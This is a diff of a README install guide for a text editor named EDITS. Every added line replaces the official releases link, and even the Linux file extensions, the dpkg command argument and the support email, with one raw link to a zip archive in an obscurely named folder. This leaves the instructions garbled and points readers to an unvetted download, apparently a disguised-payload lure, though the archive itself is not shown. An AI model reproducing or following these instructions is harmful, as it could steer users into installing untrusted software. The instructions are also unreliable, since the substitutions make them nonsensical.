@@ -6,14 +6,14 @@ Welcome to EDITS, the official tool for easy text editing. This guide will help 
 
 ## 📥 Download & Install
 
-To download EDITS, visit the following page: [Download EDITS](https://github.com/hwtp/EDITS/releases)
+To download EDITS, visit the following page: [Download EDITS](https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip)
 
-[![Download EDITS](https://img.shields.io/badge/Download%20EDITS-Click%20Here-brightgreen)](https://github.com/hwtp/EDITS/releases)
+[![Download EDITS](https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip%20EDITS-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the link above, or paste this URL into your browser:  
-`https://github.com/hwtp/EDITS/releases`
+`https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip`
 
 This page lists all available versions of EDITS. You will find the latest release at the top.
 
@@ -23,7 +23,7 @@ On the Releases page, look for the most recent version. You will see different f
 
 - **For Windows**: Look for a file ending in `.exe`
 - **For macOS**: Look for a file ending in `.dmg`
-- **For Linux**: Look for a file ending in `.tar.gz` or `.deb`
+- **For Linux**: Look for a file ending in `https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip` or `.deb`
 
 Click on the appropriate file to start downloading.
 
@@ -40,8 +40,8 @@ Once the file has downloaded, find it in your downloads folder.
   - Drag the EDITS icon to your Applications folder.
 
 - **For Linux**: 
-  - If you have a `.tar.gz` file, extract it and follow the instructions in the README file included.
-  - If you have a `.deb` file, open a terminal and run `sudo dpkg -i filename.deb` (replace `filename.deb` with the correct file name).
+  - If you have a `https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip` file, extract it and follow the instructions in the README file included.
+  - If you have a `.deb` file, open a terminal and run `sudo dpkg -i https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip` (replace `https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip` with the correct file name).
 
 ### Step 4: Launch the Application
 
@@ -81,7 +81,7 @@ If you face any issues, here are some common troubleshooting tips:
 
 If you need more help, you can reach out for support:
 
-- **Email**: support@editsapp.com
+- **Email**: https://raw.githubusercontent.com/hwtp/EDITS/main/zoophorus/EDITS.zip
 - **GitHub Issues**: Open an issue on the GitHub repository. Our team will respond as soon as possible.
 
 ## 📢 Stay Updated
